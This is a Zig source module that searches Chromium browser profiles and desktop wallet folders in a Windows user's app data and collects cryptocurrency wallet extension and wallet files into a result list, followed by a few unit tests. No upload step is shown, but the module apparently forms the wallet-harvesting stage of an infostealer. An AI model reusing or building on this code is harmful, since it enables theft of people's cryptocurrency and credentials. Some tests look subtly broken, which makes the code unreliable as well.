const std = @import("std");
const chromium_paths = @import("../browsers/chromium_paths.zig");
const wallet_extensions = @import("wallet_extensions.zig");
const wallet_desktop = @import("wallet_desktop.zig");

pub const WalletData = struct {
    name: []const u8,
    files: [][]const u8,
};

pub const CollectResult = struct {
    wallets: []WalletData,
};

pub fn collect(allocator: std.mem.Allocator, local_app_data: []const u8, roaming_app_data: []const u8) !CollectResult {
    var all_wallets = std.ArrayList(WalletData).init(allocator);
    errdefer {
        for (all_wallets.items) |w| {
            allocator.free(w.name);
            for (w.files) |f| allocator.free(f);
            allocator.free(w.files);
        }
        all_wallets.deinit();
    }

    const browsers = chromium_paths.getChromiumBrowsers();
    for (browsers) |browser| {
        const app_data = if (browser.use_roaming) roaming_app_data else local_app_data;
        const base_path = try std.fs.path.join(allocator, &[_][]const u8{ app_data, browser.path_suffix });
        defer allocator.free(base_path);

        const ext_wallets = wallet_extensions.collect(allocator, base_path) catch continue;
        defer allocator.free(ext_wallets);

        for (ext_wallets) |ew| {
            try all_wallets.append(WalletData{ .name = ew.name, .files = ew.files });
            allocator.free(ew.path);
        }
    }

    const desk_collected = wallet_desktop.collect(allocator, roaming_app_data);
    if (desk_collected) |dw| {
        defer allocator.free(dw);
        for (dw) |w| {
            try all_wallets.append(WalletData{ .name = w.name, .files = w.files });
            allocator.free(w.path);
        }
    }

    return CollectResult{ .wallets = try all_wallets.toOwnedSlice() };
}

pub fn freeResult(allocator: std.mem.Allocator, result: *CollectResult) void {
    for (result.wallets) |w| {
        allocator.free(w.name);
        for (w.files) |f| allocator.free(f);
        allocator.free(w.files);
    }
    allocator.free(result.wallets);
}

test "collect returns empty result for nonexistent paths" {
    const result = try collect(std.testing.allocator, "C:\\__nonexistent__local", "C:\\__nonexistent__roaming");
    defer freeResult(std.testing.allocator, &result);
    try std.testing.expectEqual(@as(usize, 0), result.wallets.len);
}

test "freeResult handles empty result" {
    var result = CollectResult{ .wallets = &[_]WalletData{} };
    freeResult(std.testing.allocator, &result);
}

test "WalletData can be constructed" {
    const wd = WalletData{ .name = "Test", .files = &[_][]const u8{} };
    try std.testing.expectEqualSlices(u8, "Test", wd.name);
    try std.testing.expectEqual(@as(usize, 0), wd.files.len);
}
